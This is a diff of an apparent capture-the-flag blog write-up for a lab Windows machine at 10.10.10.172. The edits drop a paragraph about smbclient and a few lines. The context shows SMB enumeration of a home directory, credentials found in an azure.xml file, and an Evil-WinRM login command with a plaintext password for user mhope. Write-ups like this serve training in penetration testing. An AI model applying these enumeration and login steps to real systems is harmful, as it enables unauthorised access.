@@ -400,12 +400,7 @@ smb: \> ls
 
 I can connect, and I also see a list of possible directories. I manually enumerated these directories, and when I viewed mhope's, I found an xml file:
 
-{% endhighlight %}
-
-And again, I used another tool to attempt to connect to this remote home directory! I used another common enumeration tool, smbclient. Smbclient is a tool that can be viewed as similar to FTP on a local network. It connects to a local resource to access the SMB/CIFS resources on a remote computer. The SMB/CIFS is Server Message Block/Common Internet File System resource. Using smbclient, I used the same login information for rpcclient to login to smbclient:
-
 {% highlight bash linenos %}
-smb: \> cd mhope
 smb: \mhope\> ls
   .                                   D        0  Fri Jan  3 07:41:18 2020
   ..                                  D        0  Fri Jan  3 07:41:18 2020
@@ -443,7 +438,6 @@ cat azure.xml
 {% endhighlight %}
 
 And with that, I had user credentials! As I always do, once I have credentials on a Windows machine I attempted to login with <a href="https://github.com/Hackplayers/evil-winrm" target="_blank">Evil-WinRM</a>. This is an evil implenetation of the Windows Remote Management tool. It allows attackers to log into computers and provides a lot of features for testers to use, including the ability to quickly upload and download files. I logged in, and was able to own user on the box:
-
 
 {% highlight bash linenos %}
 evil-winrm -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$
